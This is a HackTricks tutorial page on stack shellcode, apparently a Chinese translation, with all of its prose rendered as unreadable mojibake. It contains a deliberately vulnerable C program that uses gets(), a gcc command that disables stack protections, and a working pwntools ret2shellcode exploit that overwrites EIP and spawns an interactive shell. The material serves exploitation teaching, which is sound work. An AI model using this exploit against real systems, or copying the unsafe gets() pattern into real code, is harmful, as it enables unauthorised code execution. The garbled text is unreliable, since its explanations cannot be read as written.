# Stack Shellcode

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

**Stack shellcode** æ˜¯ä¸€ç§ç”¨äº **äºŒè¿›åˆ¶åˆ©ç”¨** çš„æŠ€æœ¯ï¼Œæ”»å‡»è€…å°† shellcode å†™å…¥æ˜“å—æ”»å‡»ç¨‹åºçš„æ ˆä¸­ï¼Œç„¶åä¿®æ”¹ **æŒ‡ä»¤æŒ‡é’ˆ (IP)** æˆ– **æ‰©å±•æŒ‡ä»¤æŒ‡é’ˆ (EIP)** ä»¥æŒ‡å‘è¯¥ shellcode çš„ä½ç½®ï¼Œä»è€Œå¯¼è‡´å…¶æ‰§è¡Œã€‚è¿™æ˜¯ä¸€ç§ç»å…¸çš„æ–¹æ³•ï¼Œç”¨äºè·å¾—æœªæˆæƒè®¿é—®æˆ–åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯è¯¥è¿‡ç¨‹çš„åˆ†è§£ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç®€å•çš„ C ç¤ºä¾‹ä»¥åŠå¦‚ä½•ä½¿ç”¨ Python å’Œ **pwntools** ç¼–å†™ç›¸åº”çš„åˆ©ç”¨ä»£ç ã€‚

### C ç¤ºä¾‹ï¼šä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¨‹åº

è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„æ˜“å—æ”»å‡»çš„ C ç¨‹åºç¤ºä¾‹å¼€å§‹ï¼š
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
è¿™ä¸ªç¨‹åºç”±äºä½¿ç”¨äº† `gets()` å‡½æ•°è€Œå®¹æ˜“å—åˆ°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚

### ç¼–è¯‘

è¦åœ¨ç¦ç”¨å„ç§ä¿æŠ¤ï¼ˆä»¥æ¨¡æ‹Ÿæ˜“å—æ”»å‡»çš„ç¯å¢ƒï¼‰çš„æƒ…å†µä¸‹ç¼–è¯‘æ­¤ç¨‹åºï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: ç¦ç”¨æ ˆä¿æŠ¤ã€‚
* `-z execstack`: ä½¿æ ˆå¯æ‰§è¡Œï¼Œè¿™å¯¹äºæ‰§è¡Œå­˜å‚¨åœ¨æ ˆä¸Šçš„ shellcode æ˜¯å¿…è¦çš„ã€‚
* `-no-pie`: ç¦ç”¨ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿é¢„æµ‹æˆ‘ä»¬çš„ shellcode å°†ä½äºçš„å†…å­˜åœ°å€æ›´å®¹æ˜“ã€‚
* `-m32`: å°†ç¨‹åºç¼–è¯‘ä¸º 32 ä½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºç®€åŒ–æ¼æ´å¼€å‘ã€‚

### ä½¿ç”¨ Pwntools çš„ Python æ¼æ´

ä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨ **pwntools** åœ¨ Python ä¸­ç¼–å†™ä¸€ä¸ª **ret2shellcode** æ”»å‡»çš„æ¼æ´ï¼š
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
è¿™ä¸ªè„šæœ¬æ„é€ äº†ä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œç”±**NOPæ»‘å—**ã€**shellcode**ç»„æˆï¼Œç„¶åç”¨æŒ‡å‘NOPæ»‘å—çš„åœ°å€è¦†ç›–**EIP**ï¼Œç¡®ä¿shellcodeè¢«æ‰§è¡Œã€‚

**NOPæ»‘å—**ï¼ˆ`asm('nop')`ï¼‰ç”¨äºå¢åŠ æ‰§è¡Œâ€œæ»‘å…¥â€æˆ‘ä»¬çš„shellcodeçš„æœºä¼šï¼Œè€Œä¸ç®¡ç¡®åˆ‡åœ°å€æ˜¯ä»€ä¹ˆã€‚è°ƒæ•´`p32()`å‚æ•°ä¸ºç¼“å†²åŒºçš„èµ·å§‹åœ°å€åŠ ä¸Šä¸€ä¸ªåç§»é‡ï¼Œä»¥ä¾¿è½å…¥NOPæ»‘å—ã€‚

## ä¿æŠ¤æªæ–½

* [**ASLR**](../../common-binary-protections-and-bypasses/aslr/) **åº”è¯¥è¢«ç¦ç”¨**ï¼Œä»¥ç¡®ä¿åœ°å€åœ¨æ‰§è¡Œä¹‹é—´æ˜¯å¯é çš„ï¼Œå¦åˆ™å­˜å‚¨å‡½æ•°çš„åœ°å€ä¸ä¼šæ€»æ˜¯ç›¸åŒï¼Œä½ éœ€è¦ä¸€äº›æ³„æ¼æ¥æ‰¾å‡ºwinå‡½æ•°åŠ è½½çš„ä½ç½®ã€‚
* [**æ ˆé‡‘ä¸é›€**](../../common-binary-protections-and-bypasses/stack-canaries/)ä¹Ÿåº”è¯¥è¢«ç¦ç”¨ï¼Œå¦åˆ™è¢«ç ´åçš„EIPè¿”å›åœ°å€å°†æ°¸è¿œä¸ä¼šè¢«è·Ÿéšã€‚
* [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **æ ˆ**ä¿æŠ¤å°†é˜»æ­¢åœ¨æ ˆå†…æ‰§è¡Œshellcodeï¼Œå› ä¸ºè¯¥åŒºåŸŸå°†ä¸å¯æ‰§è¡Œã€‚

## å…¶ä»–ç¤ºä¾‹ä¸å‚è€ƒ

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64ä½ï¼ŒASLRä¸æ ˆåœ°å€æ³„æ¼ï¼Œå†™å…¥shellcodeå¹¶è·³è½¬åˆ°å®ƒ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32ä½ï¼ŒASLRä¸æ ˆæ³„æ¼ï¼Œå†™å…¥shellcodeå¹¶è·³è½¬åˆ°å®ƒ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32ä½ï¼ŒASLRä¸æ ˆæ³„æ¼ï¼Œæ¯”è¾ƒä»¥é˜²æ­¢è°ƒç”¨exit()ï¼Œç”¨ä¸€ä¸ªå€¼è¦†ç›–å˜é‡å¹¶å†™å…¥shellcodeå¹¶è·³è½¬åˆ°å®ƒ
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64ï¼Œæ— ASLRï¼ŒROPå°å·¥å…·ä½¿æ ˆå¯æ‰§è¡Œå¹¶è·³è½¬åˆ°æ ˆä¸­çš„shellcode

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
